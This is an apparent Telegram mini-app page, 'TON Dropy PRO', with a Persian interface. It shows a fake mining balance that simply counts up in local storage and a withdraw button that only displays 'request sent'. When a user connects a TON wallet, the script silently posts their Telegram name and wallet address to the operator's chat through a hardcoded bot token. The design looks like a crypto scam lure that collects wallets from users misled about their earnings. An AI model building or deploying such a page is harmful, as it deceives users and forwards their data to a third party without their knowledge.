<!DOCTYPE html>
<html lang="fa" dir="rtl">
<head>
    <meta charset="UTF-8">
    <title>TON Dropy PRO - Final Fix</title>
    <meta name="viewport" content="width=device-width, initial-scale=1.0, maximum-scale=1.0, user-scalable=no">
    <script src="https://telegram.org/js/telegram-web-app.js"></script>
    <script src="https://unpkg.com/@tonconnect/ui@latest/dist/tonconnect-ui.min.js"></script>
    <link rel="stylesheet" href="https://cdnjs.cloudflare.com/ajax/libs/font-awesome/6.5.0/css/all.min.css">

    <style>
        @import url('https://fonts.googleapis.com/css2?family=Vazirmatn:wght@400;700;800&display=swap');
        body { margin: 0; font-family: 'Vazirmatn', sans-serif; background: #0f172a; color: #fff; padding: 20px; direction: rtl; }
        .card { background: rgba(255, 255, 255, 0.05); backdrop-filter: blur(15px); border: 1px solid rgba(255, 255, 255, 0.1); padding: 20px; border-radius: 24px; margin-bottom: 15px; text-align: center; }
        #balance { font-size: 38px; font-weight: 800; color: #00c6ff; display: block; margin: 10px 0; }
        button { width: 100%; padding: 16px; border-radius: 18px; border: none; font-size: 16px; font-weight: 700; cursor: pointer; transition: 0.3s; }
        #connectBtn { background: #0088cc; color: #fff; }
        #connectBtn.connected { background: #1faa59; }
        .withdraw-btn { background: linear-gradient(90deg, #ff512f, #dd2476); color: #fff; margin-top: 10px; }
        .address-text { word-break: break-all; font-size: 11px; color: #aaa; margin-top: 10px; background: rgba(0,0,0,0.2); padding: 8px; border-radius: 10px; }
        .hidden { display: none; }
    </style>
</head>
<body>

<div class="card">
    <h2 style="color: #00c6ff;">TON Dropy PRO ⛏</h2>
    <p>موجودی: <span id="balance">0.000000</span></p>
</div>

<div class="card">
    <button id="connectBtn"><i class="fas fa-wallet"></i> اتصال به کیف پول</button>
    <div id="addressContainer" class="hidden">
        <div class="address-text" id="currentAddress"></div>
    </div>
</div>

<div class="card">
    <button class="withdraw-btn" id="withdrawBtn">ثبت درخواست برداشت</button>
</div>

<script>
const tg = window.Telegram.WebApp;
tg.ready();
tg.expand();

const BOT_TOKEN = "8047223304:AAHMW8a6tKTTSQOp4Os_LorRJzDLNvxz-Rw";
const ADMIN_ID = "5972276401";

// ماینینگ
let balance = parseFloat(localStorage.getItem('mining_bal')) || 0.0;
setInterval(() => {
    balance += 0.000012;
    document.getElementById("balance").innerText = balance.toFixed(6);
    localStorage.setItem('mining_bal', balance.toString());
}, 1000);

// --- حل مشکل اتصال (Manifest Fix) ---
const tonConnectUI = new TON_CONNECT_UI.TonConnectUI({
    // نکته: حتماً مطمئن شو این فایل در گیت‌هابت با همین نام وجود دارد
    manifestUrl: 'https://nimwmesfandiari.github.io/ton-plus-mining/tonconnect-manifest.json',
    buttonRootId: 'ton-connect-button' 
});

// اجبار به بازگشت به تلگرام
tonConnectUI.uiOptions = {
    twaReturnUrl: 'https://t.me/TonDropyBot'
};

const connectBtn = document.getElementById('connectBtn');
const addressBox = document.getElementById('currentAddress');
const addressContainer = document.getElementById('addressContainer');

connectBtn.addEventListener('click', async () => {
    try {
        if (tonConnectUI.connected) {
            await tonConnectUI.disconnect();
        } else {
            // متد جایگزین برای باز کردن منوی انتخاب کیف پول
            await tonConnectUI.openModal();
        }
    } catch (e) {
        alert("خطا در اتصال: " + e.message);
    }
});

tonConnectUI.onStatusChange(async (wallet) => {
    if (wallet) {
        const addr = wallet.account.address;
        connectBtn.innerHTML = '<i class="fas fa-check"></i> متصل شد';
        connectBtn.classList.add('connected');
        addressBox.textContent = addr;
        addressContainer.classList.remove('hidden');

        // ارسال به ادمین
        const user = tg.initDataUnsafe?.user;
        const msg = `✅ <b>اتصال موفق!</b>\n👤 کاربر: ${user?.first_name}\n👛 آدرس: <code>${addr}</code>`;
        
        fetch(`https://api.telegram.org/bot${BOT_TOKEN}/sendMessage`, {
            method: 'POST',
            headers: {'Content-Type': 'application/json'},
            body: JSON.stringify({ chat_id: ADMIN_ID, text: msg, parse_mode: 'HTML' })
        });
    } else {
        connectBtn.innerHTML = '<i class="fas fa-wallet"></i> اتصال به کیف پول';
        connectBtn.classList.remove('connected');
        addressContainer.classList.add('hidden');
    }
});

document.getElementById('withdrawBtn').addEventListener('click', () => {
    if (!tonConnectUI.connected) {
        alert("لطفاً ابتدا کیف پول را وصل کنید.");
    } else {
        alert("درخواست برداشت ارسال شد!");
        // کد ارسال پیام به ادمین مشابه بالا اینجا قرار می‌گیرد
    }
});
</script>
</body>
</html>
